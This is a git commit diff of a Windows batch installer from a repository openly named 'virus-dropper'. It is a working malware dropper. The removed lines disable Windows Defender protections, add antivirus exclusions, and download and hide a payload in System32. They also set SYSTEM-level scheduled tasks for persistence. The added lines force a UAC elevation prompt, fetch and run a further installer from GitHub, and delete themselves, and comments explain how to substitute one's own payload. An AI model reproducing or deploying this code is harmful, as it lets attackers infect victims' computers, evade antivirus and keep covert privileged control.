316942a8a0aff8905997ae55903c3e3960b45d37
YumYummity <103061664+YumYummity@users.noreply.github.com>
2022-05-04 20:03:30 -0400

    Update InstallPERSISTENT.bat

--- install/InstallPERSISTENT.bat
+++ install/InstallPERSISTENT.bat
@@ -1,37 +1,29 @@
-color ef
-::disables ControlledFolderAccess to access files and folders
-powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%~dp0'"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/AV.bat" --output "AV.bat"
-start /min AV.bat
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
-NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
-::windows defender exclusions
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionProcess '"Windows.exe'"
-::direct download link
-::edit this to your files
-md "%systemroot%\System32\Windowsexe"
+@echo off
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"="
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    taskkill /f /IM explorer.exe
+    start explorer.exe
+    exit /B
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
 
-::upload files here: github.com - create account and create repository (public) then upload files
-::put payload file DIRECT download link here:
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Windows.exe" --output "%appdata%\Windows.exe"
-::do not change the --output, unless the payload is not a .exe file. (in that case, change all mentions of Windows.exe to Windows.extension)
 
 
-move "%appdata%\Windows.exe" "%systemroot%\System32\Windowsexe"
-curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/Update.bat" --output "%appdata%\update.bat"
-move "%appdata%\update.bat" "%systemroot%\System32\Windowsexe"
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%systemroot%\System32\Windowsexe'"
-NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
-start "Windows.exe" "%systemroot%\System32\Windowsexe\Windows.exe"
-move "AV.bat" "%systemroot%\System32\Windowsexe\AV.bat"
-powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
-del /f rickroll.*
-del /f NSudo.exe
-powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
+::Create a copy of install.bat, and edit items inside as directed
+::Edit this link to the DIRECT download link of the new install.bat
+curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
+::do not change --output
+
+start /min Install.bat
 call :deleteSelf&exit
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
